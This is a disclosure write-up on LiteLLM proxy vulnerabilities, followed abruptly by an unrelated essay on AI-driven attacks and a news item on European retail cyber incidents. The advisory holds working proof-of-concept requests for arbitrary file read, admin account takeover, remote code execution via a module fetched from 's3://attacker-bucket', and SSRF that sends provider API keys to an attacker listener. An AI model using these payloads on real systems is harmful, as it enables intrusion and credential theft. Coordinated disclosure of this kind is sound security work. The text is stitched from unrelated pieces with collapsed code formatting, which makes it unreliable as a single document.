# litellm/proxy/proxy_server.py (login flows at lines ~7962, ~8066, ~8203)response = await generate_key_helper_fn(request_type=”key”,**{“user_role”: user_role,“duration”: “24hr”,“key_max_budget”: litellm.max_ui_session_budget,“models”: [],“aliases”: {},“config”: {},“spend”: 0,“user_id”: user_id,“team_id”: “litellm-dashboard”, # <– Key assignment},)

Step 2.b: Token Classification Based on Team ID

During authorization, common_checks classifies tokens as either “ui” or “api” based solely on the team_id field:

# litellm/proxy/auth/auth_checks.py (lines 224-227)token_team = getattr(valid_token, “team_id”, None)token_type: Literal[“ui”, “api”] = (“ui” if token_team is not None and token_team == “litellm-dashboard” else “api”)

Step 2.c: UI Tokens Get Permissive Route Check

If the token is classified as “ui”, the authorization logic routes to _is_ui_route() instead of the stricter _is_api_route_allowed():

# litellm/proxy/auth/auth_checks.py (lines 335-356)def _is_allowed_route(route: str,token_type: Literal[“ui”, “api”],# …) -> bool:if token_type == “ui” and _is_ui_route(route=route, user_obj=user_obj):return True # <– Bypasses stricter API route checkselse:return _is_api_route_allowed(…)

Step 2.d: Prefix Matching Allows /config/update

The ui_routes list includes /config, likely intended to allow reading configuration:

# litellm/proxy/_types.py (lines 490-510)ui_routes = [“/sso”,“/sso/get/ui_settings”,“/login”,“/key/info”,“/config”, # <– Likely intended for read-only config access“/spend”,# …]

The _is_ui_route function uses startswith matching:

# litellm/proxy/auth/auth_checks.py (lines 247-269)def _is_ui_route(route: str, …) -> bool:allowed_routes = LiteLLMRoutes.ui_routes.valueif (route is not Noneand isinstance(route, str)and any(route.startswith(allowed_route) for allowed_route in allowed_routes)):return True # <– /config/update matches startswith(“/config”)

Because /config/update satisfies startswith(“/config”), the check passes. The request is permitted for any user with a valid UI session token, regardless of their actual role (Admin, Internal User, etc.).

Impact

This access control failure allows any authenticated user, including those with the baseline “Internal User” role, to invoke POST /config/update and modify the proxy’s runtime configuration. Through this single exposed endpoint, attackers can achieve:

Arbitrary File Read

Administrative Account Takeover

Remote Code Execution via Pass-Through Endpoints

Each of these exploitation scenarios is detailed in the following sections.

Arbitrary File Read

Impact: Read any file accessible to the LiteLLM process, including configuration files, secrets, and credentials.

The /config/update endpoint accepts an environment_variables field, allowing callers to inject arbitrary key-value pairs into the proxy’s environment. One such variable, UI_LOGO_PATH, controls the file path served by the /get_image endpoint. By setting this variable to a sensitive file path, an attacker can read arbitrary files from the server.

Source: Environment Variable Injection

When /config/update receives environment variables, it encrypts and persists them to the configuration store. This results in the following code being executed, which decrypts these values and writes them directly to os.environ:

# litellm/proxy/proxy_server.py (lines 2841-2860)def _decrypt_and_set_db_env_variables(self, environment_variables: dict) -> dict:“””Decrypts a dictionary of environment variables and then sets them in the environment“””decrypted_env_vars = {}for k, v in environment_variables.items():try:decrypted_value = decrypt_value_helper(value=v, key=k)if decrypted_value is not None:os.environ[k] = decrypted_value # <– Attacker-controlled value set heredecrypted_env_vars[k] = decrypted_valueexcept Exception as e:verbose_proxy_logger.error(“Error setting env variable: %s – %s”, k, str(e))return decrypted_env_vars

Sink: Unvalidated File Path in `/get_image`

The `/get_image` endpoint reads `UI_LOGO_PATH` from the environment and serves the file at that path without any validation:

# litellm/proxy/proxy_server.py (lines 8329-8358)@app.get(“/get_image”, include_in_schema=False)def get_image():“””Get logo to show on admin UI”””current_dir = os.path.dirname(os.path.abspath(__file__))default_logo = os.path.join(current_dir, “logo.jpg”)logo_path = os.getenv(“UI_LOGO_PATH”, default_logo) # <– Attacker-controlledverbose_proxy_logger.debug(“Reading logo from path: %s”, logo_path)if logo_path.startswith((“http://”, “https://”)):# … remote URL handling …else:# Return the local image file if the logo path is not an HTTP/HTTPS URLreturn FileResponse(logo_path, media_type=”image/jpeg”) # <– Arbitrary file read

Proof of Concept

Step 1: Inject `UI_LOGO_PATH ` environment variable

POST /config/update HTTP/1.1Host: localhost:4000Authorization: Bearer sk-[REDACTED-LiteLLM-API-KEY]Content-Type: application/json{“environment_variables”: {“UI_LOGO_PATH”: “/etc/passwd”}}

Step 2: Retrieve file contents

GET /get_image HTTP/1.1Host: localhost:4000

Response:

HTTP/1.1 200 OKcontent-type: image/jpegcontent-length: 812root:x:0:0:root:/root:/bin/ashbin:x:1:1:bin:/bin:/sbin/nologin[…]sshd:x:22:22:sshd:/dev/null:/sbin/nologinnobody:x:65534:65534:nobody:/:/sbin/nologinnonroot:x:65532:65532:Account created by apko:/home/nonroot:/bin/sh

The server returns the contents of /etc/passwd, demonstrating arbitrary file read capability.

Administrative Account Take Over

Impact: a low-privilege user can assume control over the default administrative account for the LiteLLM instance, allowing total control over the gateway and access to any contained provider credentials.

The same environment variable injection primitive can be used to hijack administrative access to the LiteLLM proxy. The UI login flow authenticates users against the UI_USERNAME and UI_PASSWORD environment variables. By overwriting these values, an attacker can set their own credentials and log in as a full Proxy Admin.

Vulnerable Authentication Flow

The `/login` endpoint reads credentials directly from environment variables:

# litellm/proxy/proxy_server.py (lines 7882-7896)form = await request.form()username = str(form.get(“username”))password = str(form.get(“password”))ui_username = os.getenv(“UI_USERNAME”, “admin”) # <– Attacker-controlledui_password = os.getenv(“UI_PASSWORD”, None) # <– Attacker-controlledif ui_password is None:ui_password = str(master_key) if master_key is not None else None

When credentials match, the user is granted full administrative privileges:

# litellm/proxy/proxy_server.py (lines 7922-7927)if secrets.compare_digest(username, ui_username) and secrets.compare_digest(password, ui_password):# Non SSO -> If user is using UI_USERNAME and UI_PASSWORD they are Proxy adminuser_role = LitellmUserRoles.PROXY_ADMINuser_id = litellm_proxy_admin_name

Proof of Concept

Step 1: Inject attacker-controlled credentials

When authenticated via the UI, the user can update the administrator credentials with the following POST request:

POST /config/update HTTP/1.1Host: localhost:4000Authorization: Bearer sk-[REDACTED-LiteLLM-API-KEY]Content-Type: application/json{“environment_variables”: {“UI_USERNAME”: “hacker”,“UI_PASSWORD”: “hacker”}}

Step 2: Log in with the injected credentials

Navigate to the LiteLLM UI login page and authenticate with:

Username: hacker

Password: hacker

The screenshot below shows the full HTTP request/response pair associated with the login request, showing the new username and password being used, and the request being accepted with the server issuing a JWT for the built-in ‘admin’ account.

The next screenshot shows the UI of the dashboard, showing we are indeed logged in as the default admin user.

Remote Code Execution via Pass Through Endpoints

Impact: A low-privilege user can obtain full remote-code execution on the LiteLLM gateway, allowing arbitrary command execution or an interactive reverse shell. Providing full access to all LiteLLM data and a foothold into the network where the LiteLLM gateway is deployed.

LiteLLM supports “pass-through endpoints” that can proxy requests to external services or load custom adapter modules. The /config/update endpoint allows defining pass-through endpoints with a target parameter that supports loading Python modules from remote storage (S3 or GCS). When a target URL starts with s3:// or gcs://, LiteLLM downloads and executes the Python file, leading to remote code execution.

Attack Chain

Step 1: Configuration Update Triggers Endpoint Initialization

When /config/update receives general_settings.pass_through_endpoints, it calls _update_general_settings() which initializes the endpoints:

# litellm/proxy/proxy_server.py (lines 2996-3003)## PASS-THROUGH ENDPOINTS ##if “pass_through_endpoints” in _general_settings:general_settings[“pass_through_endpoints”] = _general_settings[“pass_through_endpoints”]await initialize_pass_through_endpoints(pass_through_endpoints=general_settings[“pass_through_endpoints”])

Step 2: Route Creation Invokes Module Loading

During endpoint initialization, the target is passed to create_pass_through_route(), which attempts to load it as an adapter:

# litellm/proxy/pass_through_endpoints/pass_through_endpoints.py (lines 943-947)try:if isinstance(target, CustomLogger):adapter = targetelse:adapter = get_instance_fn(value=target) # <– Loads remote module

Step 3: Remote Module Download and Execution

When the target starts with `s3://` or `gcs://`, `get_instance_fn()` delegates to `_load_instance_from_remote_storage()`:

# litellm/proxy/types_utils/utils.py (lines 8-14)def get_instance_fn(value: str, config_file_path: Optional[str] = None) -> Any:module_name = valueinstance_name = Nonetry:# Check if value starts with s3:// or gcs://if value.startswith(“s3://”) or value.startswith(“gcs://”):return _load_instance_from_remote_storage(value, config_file_path)

This function downloads the Python file and executes it using importlib:

# litellm/proxy/types_utils/utils.py (lines 153-159)# Load the module from the downloaded file using the actual module namespec = importlib.util.spec_from_file_location(module_path, local_file_path)if spec is None or spec.loader is None:raise ImportError(f”Could not create module spec for {local_file_path}”)module = importlib.util.module_from_spec(spec)spec.loader.exec_module(module) # <– Arbitrary code execution

The call to `exec_module()` executes all top-level code in the downloaded Python file, including import-time side effects.

Proof of Concept

Malicious Adapter (hosted at s3://attacker-bucket /adapters/evil_adapter.py):

import os# Import-time side effect: create a marker directoryos.makedirs(“/tmp/litellm-pwned”, exist_ok=True)class PwnAdapter:def __call__(self, *args, **kwargs):# No-op adapter; existence is enough for get_instance_fnreturn None# Instance name referenced in the ‘target’proxy_handler_instance = PwnAdapter()

Step 1: Register the malicious pass-through endpoint

POST /config/update HTTP/1.1Host: localhost:4000Authorization: Bearer sk-[REDACTED-LiteLLM-API-KEY]Content-Type: application/json{“general_settings”: {“pass_through_endpoints”: [{“id”: “pt-rce-poc”,“path”: “/evil”,“target”: “s3://attacker-bucket /adapters/evil_adapter.proxy_handler_instance”,“include_subpath”: true}]}}

When this request is processed, LiteLLM:

Parses the S3 URL to extract bucket (attacker-bucket) and object key (adapters/evil_adapter.py)

Downloads the Python file to a temporary location

Calls exec_module() which executes the top-level os.makedirs() call

The marker directory /tmp/litellm-pwned is created, confirming code execution

The screenshot below from inside of the Docker container running LiteLLM shows that our arbitrary code was executed and our marker directory was created:

While this proof of concept creates a benign marker directory, an attacker could replace the payload with a reverse shell, credential theft, or any arbitrary code execution.

Server-Side Request Forgery Leading to LLM Provider API key Extraction

Separately from the access control bypass documented above, LiteLLM exposes a documented feature called “Clientside LLM Credentials” that allows any authenticated user to redirect LLM API calls to arbitrary endpoints. This creates a Server-Side Request Forgery (SSRF) vulnerability that can be exploited to steal API credentials or probe internal networks.

Overview

The /chat/completions endpoint (and other LLM endpoints) accepts a user_config parameter in the request body. When present, this parameter causes LiteLLM to create a new router with attacker-controlled settings, including the ability to specify a custom api_base URL.

Vulnerable Code Path

When a request contains `user_config`, the routing logic in `route_llm_request.py` creates a new router with the attacker’s configuration:

# litellm/proxy/route_llm_request.py (lines 122-127)elif “user_config” in data:router_config = data.pop(“user_config”)user_router = litellm.Router(**router_config) # <– Attacker-controlled routerret_val = getattr(user_router, f”{route_type}”)(**data)user_router.discard()return ret_val

No validation is performed on the user_config contents. The attacker can specify a complete model_list with arbitrary api_base values, causing subsequent API calls to be sent to attacker-controlled servers.

Proof of Concept

Attacker’s Server Setup:

Set up a listener on an attacker-controlled server (e.g., 10.10.13.37:9999) to capture incoming requests. In this case, we use a simple netcat listener but any webserver is sufficient.

Malicious Request:

When this request is processed:

LiteLLM creates a new router using the attacker’s model_list

The chat completion request is sent to http://10.10.13.37:9999 instead of the legitimate OpenAI API

The attacker’s server receives the full request, including any configured API keys in the proxy’s default headers

Attacker’s Listener:

Below shows the attacker’s listener that receives the original LLM provider API key which the LiteLLM user should not have access to.

Note: While LiteLLM’s configurable_clientside_auth_params setting restricts direct api_base and api_key parameters in the request body, the user_config parameter follows a different code path that bypasses these restrictions entirely. This allows the documented “Clientside LLM Credentials” feature to be exploited for SSRF without any guardrails.

Miscellaneous Vulnerabilities

During our security assessment, we identified several additional vulnerabilities that, while not directly exploitable for full system compromise, represent significant security weaknesses:

Exposure of Password Hashes

Note: this issue was reported to LiteLLM and acknowledged at the time of reporting – however the issue appears to be a duplicate finding and is being tracked as GHSA-69×8-hrgq-fjj8.

The LiteLLM proxy exposes password hashes through various API endpoints, allowing authenticated users to retrieve hashed credentials for other users. This information disclosure increases the attack surface by providing attackers with material that can be subjected to offline cracking attempts. This information is intended to only be accessible to administrative accounts; however, due to the previously described issue with the UI based tokens, a low privileged user can access the password hashes for other accounts.

Insecure Password Hashing

Note: this issue was reported to LiteLLM and acknowledged at the time of reporting – however the issue appears to be a duplicate finding and is being tracked as GHSA-69×8-hrgq-fjj8.

Password hashes in LiteLLM are generated using a single iteration of a standard hash function without salting, rather than using modern password hashing algorithms like bcrypt, scrypt, or Argon2. This approach provides minimal protection against brute-force attacks and rainbow table lookups:

No Salt: Identical passwords produce identical hashes, enabling rainbow table attacks

Single Hash Iteration: Fast hash computation makes brute-force attacks practical

Weak Algorithm: Standard cryptographic hashes are not designed for password storage

These weaknesses significantly reduce the effort required for an attacker to crack exposed password hashes.

Assigned CVEs

The vulnerabilities documented in this post were disclosed to the LiteLLM maintainers through a coordinated disclosure process.

CVE-2026-35029: Missing Authorization in /config/update endpoint

CVE-2026-59823: Server-Side Request Forgery via user_config parameter

GHSA-69×8-hrgq-fjj8: [duplicate] Exposure of password key material

GHSA-69×8-hrgq-fjj8: [duplicate] Insecure password storage without salting

Conclusions

This security assessment of LiteLLM revealed multiple high-risk vulnerabilities that could be chained together to achieve remote code execution, arbitrary file access, and complete system compromise. The most severe issue, the missing authorization checks in /config/update combined with environment variable injection, demonstrates how a single oversight in access control can cascade into multiple high-impact exploitation paths.

LiteLLM represents an important innovation in the LLM ecosystem, providing a unified interface and management layer for interacting with language models. The rapid development pace in this space has produced powerful tools that solve real problems for organizations deploying AI systems at scale. However, speed of innovation must not come at the expense of fundamental security practices.

The vulnerabilities documented here are not novel attack classes; they include missing authorization checks, path traversal, RCE via dynamic module loading, and insecure password storage. These are well-understood security issues with established mitigation patterns. Their presence in production code highlights a concerning trend: as the AI and LLM ecosystem races forward, traditional security fundamentals are sometimes treated as secondary concerns.

Title: 5 cybersecurity assumptions AI attacks break
Context: But it’s usually framed as an arms race of capability, where whoever gets AI working first wins
Full Text:
“Will frontier AI be what finally tips the scale toward attackers?”

I hear some version of that question from almost every security and identity team I talk to. After the past year, it’s a fair question. But it’s usually framed as an arms race of capability, where whoever gets AI working first wins.

That framing misses what’s actually changing. Security operations weren’t built against a specific attacker. They were built on assumptions about how human attackers work: how fast they move, what they cost, how they learn, when they quit, and what they leave behind.

AI agents break most of those assumptions. One holds, and it’s where defenders get their advantage back.

How we tested how AI attackers work

To get past speculation, a group of us across research, incident response, and product at Silverfort built an AI attack simulator. We kept it model- and tool-agnostic and ran it in a contained lab. A lab is cleaner than most production networks, so treat what follows as patterns, not benchmarks.

Assumption #1: Attacks are sequential

Human intrusions are paced by sequence and reasoning. An operator gets credentials, stops, decides what to do next, then does it: recon, then access, then escalation, then exfiltration. Most detection and response models are built around that pacing.

Agents don’t take turns. Our simulator typically ran five to 10 agents in parallel, each working a different phase toward the same objective. Once initial credentials were in hand, the phases stopped waiting on each other. One agent harvested more credentials while another moved laterally and a third escalated privilege, each acting on what the others had already found. The full chain to domain takeover completed in four to five minutes, faster than most teams can triage a single alert.

The order (or lack of order) that cyberattacks unfold in human- versus AI-led scenarios

Agents move at machine speed, limited mainly by how fast they can take in and act on information. That outpaces any human-driven response, and often automated response too, when automation depends on shipping telemetry to a central platform and processing it before it can act.

The parallelism matters just as much. Detection logic and analyst intuition are tuned to recognize a kill chain unfolding in order. When phases overlap and feed each other instead of following in sequence, the early stage defenders are trained to catch may never show up on its own.

Assumption #2: Attacks scale with headcount

The usual read on AI economics is that attacks just got cheaper, and they did. Our simulator completed a full run for the equivalent of $12, which fell to about $4 over time. A failed run that kept iterating cost $25.

But cost isn’t the shift that matters. The real constraint on attackers has rarely been exploits or tooling. It’s the skilled labor between initial access and action on objectives.

Consider a ransomware crew with candidate access to a thousand organizations and enough skilled operators to properly work ten. The other 990 aren’t failed attacks. They’re unworked inventory. Initial access can already be generated far faster than humans can turn it into compromises.

That’s the bottleneck agents remove. Booz Allen Hamilton noted in When Cyberattacks Happen at AI Speed (March 2026) that parallel activity that once required several specialists can now be done by one person. Agents don’t need to outperform a skilled operator, and they don’t even need to be cheap.

They only need to make the next unworked foothold worth pursuing.

Assumption #3: Attackers rely on what they remember

In human operations, context is hard-earned. It lives in an operator’s head, their notes, and conversations with other actors, and it moves at the speed of people. Case management, personal knowledge management, and other tools have all improved information accessibility, but its consumption and regurgitation has always been bound by human limitations.

Our agent built a plan and spawned sub-agents. Each one wrote what it found, including assets, identities, and valid credentials, into a shared memory that every other agent could read and plan against. When a human operator finds something that changes the plan, they stop and reason through it. Agents re-plan in real time from a single source of context.

Human operators leave value on the table: a credential in a deployment script, an over-permissioned group noted and never revisited, a share that looked unimportant at 2 a.m. In a human operation, findings compete for one person’s attention. In an agent operation, every finding is immediately available to every agent that can use it. The attack surface stops being what one operator noticed and becomes the sum of everything any agent found.

Assumption #4: Attackers get tired, frustrated, or scared

Defenders have quietly relied on human friction for decades. “Burden the adversary” has been a mantra for good reason. A blocked operator gets frustrated, makes mistakes, worries about getting caught, and often moves on to an easier target.

An agent doesn’t. It is a truly persistent threat. In our simulator, a blocked task didn’t end in a give-up. It ended in another attempt, and another, with no natural limit on how many. Only when enough tasks failed did the agent step back and reconsider the plan itself. A closed door meant trying the handle again, then looking for a different door. It stopped only when it ran out of paths, never out of patience. The $25 failed run wasn’t waste. It was the agent refusing to quit.

This will change the shape of cybercrime. Much of it has been opportunistic, because tenacity was expensive and reserved for high-value targets. When tenacity costs almost nothing, less sophisticated adversaries can run sustained, targeted campaigns against a specific organization.

Assumption #5: Attackers use tools defenders can recognize

Detection has long worked in layers. Some detections key on specific attack tools. Better ones key on techniques, the behavior an attack produces regardless of the tool behind it. Beneath both sit broad behavioral analytics that fire constantly. Confidence usually comes from correlating across those layers, and that takes context and time.

Agents don’t need novel malware to stress that model. Attackers have already been moving toward trusted tooling: signed admin utilities, commercial remote access, and whatever is native to the environment. Agents accelerate that shift. They’re fluent in PowerShell, WMI, LDAP queries, and built-in utilities, and they compose them on the fly for each environment rather than carrying a known kit. Tool-specific detections lose their grip, and what’s left looks a lot like administration.

That leaves defenders leaning on their lowest-fidelity layer at the moment they need certainty most, while many parallel trails flood it with noise. Teams that can’t tell which signals matter contain broadly, and broad containment becomes its own business disruption. The attacker causes damage through the defender’s response.

What the agent can’t compose its way around is authentication. Whatever tooling it uses, it still has to present a credential. It’s no coincidence that the technique detections that hold up best, like anomalous Kerberos ticket requests or directory replication from a host that isn’t a domain controller, are anchored in authentication and directory behavior. Scoping by identity, meaning which accounts authenticated where and which of those authentications were legitimate, collapses the complexity of dozens of trails into the few identities actually driving them.

What doesn’t change because of AI attacks: agents still run on access

Attack agents were built on how human attackers operate, so the overlap is as revealing as the differences.

The first overlap is identity. Like a human, an agent moves through an environment using legitimate credentials. Once it holds a valid identity, its activity looks like normal authentication, and a compromised account behaving a little oddly rarely trips EDR or network controls.

Part of the reason is how security operations treat identity. In most SOCs, identity is an artifact: a field in a log, an attribute that enriches an alert, something to pivot on after the fact. It’s rarely treated as what it is in an intrusion, both the vehicle the attacker rides and the control point where the ride can be stopped. Agents exploit that gap at machine speed.

The second overlap is the path of least resistance. Across our runs, the agent went after non-human identities first and showed a clear preference for service accounts. Service accounts often far outnumber human identities. They’re usually over-permissioned and rarely have a single point of control.

The accounts organizations monitor least are the ones agents target most.

None of this is new. Abuse of privileged and trusted identities played a central role in intrusions like SolarWinds. What’s new is that an agent can turn everything frontier models know about attacks like that into something close to instinct, applied in minutes. The identities hardest to manage are often the ones the business depends on most. Against an attacker that goes after them first, they can no longer be neglected.

Those identities are also where the agent was stopped. When we reran the same attack with two controls enforced at authentication, a service account restricted to the systems it legitimately needed and MFA required on a domain admin across all protocols, the outcome flipped from domain compromise to “could not reach objective.” The agents re-planned around each block, but every new route still ran through an identity they couldn’t use. What mattered was where the controls sat: at the access decision, the one point the agents couldn’t route around.

Access isn’t a matter of skill. It either exists to be abused or it doesn’t.

Identity Security controls are one piece of the puzzle in defending against AI attacks

Almost every intrusion has an identity component, and lateral movement and privilege escalation have to pass through authentication. That’s where the agent is most constrained and the defender has the most leverage.

But Identity Security controls aren’t a complete answer, and it’s worth being precise about where they stop. If an agent abuses access an identity already legitimately holds, no single access decision may look wrong. Data moving through permitted paths, or an exploit against an exposed service that needs no credentials, sits outside the access decision entirely. Those still need detection, data controls, and patching.

3 questions for security leaders in the AI attack era

So does AI tip the scale? Only where access is left undefended. The shift is from treating identity as an artifact to treating it as a control. Answering AI attackers with faster detection runs into the math. A team that can’t triage at the speed of the attack won’t close the gap by triaging slightly faster. The more useful question is what your decisive first line of defense will be. Three questions help answer it:

Which non-human identities can authenticate to your most critical assets, and does anyone own them?

Which of those access decisions can you deny or challenge in real time, rather than detect after the fact?

If a service account were compromised mid-incident, how long would it take to restrict it without breaking production?

If the answers are “we don’t know,” “few,” and “hours,” that’s the gap an agent will find first.

You won’t out-triage an AI agent. You can deny the access it depends on, at the moment it tries.

Title: European Retail Firms Confirm Cyber Incidents

Full Text:
Several retail firms across Europe have confirmed cyber incidents that are causing operational disruptions.

On October 12, Netherlands-based multinational retail company Ahold Delhaize confirmed it was experiencing “a security issue” within its networks and had to take “some systems offline” to protect them.

The disruption was reported to affect three of the group’s brands, including supermarket chain Albert Heijn, operating in the Netherlands and Belgium, Dutch drugstore chain Etos and Dutch liquor store chain Gall & Gall.

The next day, Reuters reported that South African retail group The Foschini Group (TFG), owner of high-street fashion brands Hobbs and Whistles, was investigating a “cyber incident.”

The press agency said TFG became aware of an incident on October 11 affecting its UK subsidiary TFG London, with “certain IT systems” impacted.

Specifically, it was reported that the affected brands include Phase Eight and Hobbs and Whistles brands.

The South African group added there is “no reason to believe that payment information is at risk” at this stage. Other TFG high street brands, including Inside Story and White Stuff, are not affected. The group’s TFG Africa and TFG Australia subsidiaries are also not experiencing any operational disruption.

TFG said it had reported the incident to the relevant UK authorities.

Commenting on this TFG incident, Muhammad Yahya Patel, vCISO and cybersecurity advisor for EMEA at Huntress, noted, “The fact that Inside Story and White Stuff within the same group were unaffected, and that TFG’s wider Africa and Australia operations were untouched, suggests some degree of system separation was in place. That separation, which limited the blast radius, is worth noting as a positive.”

Additionally, according to The Times, H&M is also examining information circulating online about a potential incident.

However, at the time of writing, the retailer said it had found no indication that its data environment had been compromised.

There is currently no indication that these incidents are in any way related to each other.

ASOS Confirms Scope of Cyber-Attack

The incidents come days after customers of UK fashion retailer ASOS received a strange push notification indicating the company was hacked.

While the firm confirmed the unauthorized intrusion into “third-party platforms” it uses to communicate with customers and that personal information including names and contact details and some non-personal account related information “have been accessed,” it reiterated, in its latest customer update, published on October 13, that no payment-card information or account passwords were impacted.

The latest alerts also come as many supermarket chains in France are still dealing with a large-scale cyber-attack where attackers tampered with refrigeration controlling systems in the night between October 11 and 12, leading to the loss of a large amount of food products and financial losses estimated in hundreds of thousands of euros.
